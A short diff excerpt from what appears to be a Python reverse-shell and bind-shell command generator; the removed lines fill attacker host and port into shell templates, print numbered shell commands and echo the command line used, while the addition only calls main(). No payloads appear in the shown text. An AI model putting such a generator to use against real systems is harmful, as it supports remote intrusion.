-        shell_index = shells_dict[options.TYPE].index((notes, shell)) + 1
-        if options.LHOST is not None:
-            print_shell = shell.replace('{LHOST}', options.LHOST).replace('{LPORT}', options.LPORT).strip()
-        else:
-            print_shell = shell.replace('{LPORT}', options.LPORT).strip()
-        print_notes = ''
-        if notes is not None:
-            print_notes = notes + ' '
-        print(Fore.BLUE + Style.BRIGHT + '[' + str(shell_index) + '] ' + print_notes + Style.RESET_ALL + print_shell + '\n')
-    if options.SHELLTYPE == "revshells":
-        cmdline = f'{sys.argv[0]} --reverse-shell --type {options.TYPE} --lhost {options.LHOST} --lport {options.LPORT}'
-    elif options.SHELLTYPE == "bindshells":
-        cmdline = f'{sys.argv[0]} --bind-shell --type {options.TYPE} --lport {options.LPORT}'
-    print(Fore.RED + Style.BRIGHT + 'CLI command used\n' + Style.RESET_ALL + cmdline + '\n')
+    main()
